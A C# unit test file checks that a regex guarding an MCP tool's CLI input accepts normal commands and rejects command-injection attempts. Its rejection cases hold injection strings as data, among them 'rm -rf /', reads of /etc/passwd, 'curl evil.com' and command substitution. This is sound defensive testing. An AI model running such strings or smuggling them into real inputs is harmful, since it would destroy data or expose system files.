using System.Text.RegularExpressions;
using FluentAssertions;

namespace AnythinkMcp.Tests;

/// <summary>
/// Tests for the SafeArgs regex that validates CLI command input.
/// This is the primary defence against command injection.
/// </summary>
public class SafeArgsTests
{
    // Mirror the regex from CliTool.cs
    private static readonly Regex SafeArgs = new(
        @"^[\w\s\-\./:=,@""'\{\}\[\]]+$", RegexOptions.Compiled);

    [Theory]
    [InlineData("entities list")]
    [InlineData("data list blog_posts --json")]
    [InlineData("users me")]
    [InlineData("fetch /api/v1/health")]
    [InlineData("data create posts {\"title\": \"Hello World\"}")]
    [InlineData("workflows trigger 1 --data '{\"key\": \"value\"}'")]
    [InlineData("migrate --from source --to target --dry-run")]
    public void SafeArgs_ShouldAllow_ValidCommands(string command)
    {
        SafeArgs.IsMatch(command).Should().BeTrue($"'{command}' should be allowed");
    }

    [Theory]
    [InlineData("entities list; rm -rf /")]
    [InlineData("data list | cat /etc/passwd")]
    [InlineData("users me && curl evil.com")]
    [InlineData("entities list $(whoami)")]
    [InlineData("data list `id`")]
    [InlineData("entities list\t&& rm -rf /")]
    [InlineData("entities list > /tmp/output")]
    [InlineData("entities list < /etc/passwd")]
    public void SafeArgs_ShouldReject_InjectionAttempts(string command)
    {
        SafeArgs.IsMatch(command).Should().BeFalse($"'{command}' should be rejected");
    }

    [Fact]
    public void SafeArgs_ShouldReject_EmptyString()
    {
        SafeArgs.IsMatch("").Should().BeFalse();
    }
}
